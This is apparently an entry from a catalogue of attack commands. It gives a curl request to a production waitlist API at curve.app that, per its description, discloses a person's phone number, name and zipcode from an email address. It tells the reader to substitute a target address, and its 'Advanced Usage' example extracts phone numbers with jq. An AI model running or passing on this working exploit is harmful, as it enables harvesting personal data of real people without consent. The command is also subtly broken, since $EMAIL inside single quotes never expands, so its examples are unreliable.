---
data: >-
  curl -X POST https://website-api.production.curve.app/api/waitlist/us -H
  "Content-Type: application/json" -d '{"email":"$EMAIL"}'
tags:
  - api-test
  - info-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:45.219Z'
id: 50555dbb-09c7-4558-8c4a-648dea1f4799
verified: false
validated: true
submitted: true
---
# curl-waitlist-lookup

## Command

```bash
curl -X POST https://website-api.production.curve.app/api/waitlist/us -H "Content-Type: application/json" -d '{"email":"$EMAIL"}'
```

## Description

This command performs an unauthenticated POST request to the Curve waitlist API to lookup a user by email, potentially disclosing PII if the email is waitlisted. Use for testing or verification of the vulnerability; replace $EMAIL with a target address.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-d '{"email":"$EMAIL"}'` | JSON payload with email | Yes |

## Examples

### Basic Usage

```bash
EMAIL="test@example.com" curl -X POST https://website-api.production.curve.app/api/waitlist/us -H "Content-Type: application/json" -d '{"email":"$EMAIL"}'
```

### Advanced Usage

```bash
EMAIL="valid@example.com" curl -X POST https://website-api.production.curve.app/api/waitlist/us -H "Content-Type: application/json" -d '{"email":"$EMAIL"}' | jq '.phoneNumber'
```

## Expected Output

JSON response with user details on success (e.g., {"phoneNumber":"+1-123-456-7890","name":"John Doe","zipcode":"90210","_id":"abc123","position":42}), or error on invalid email.

## Related

- [[Related Procedure: Intercept-Waitlist-Track-Position-Request]]
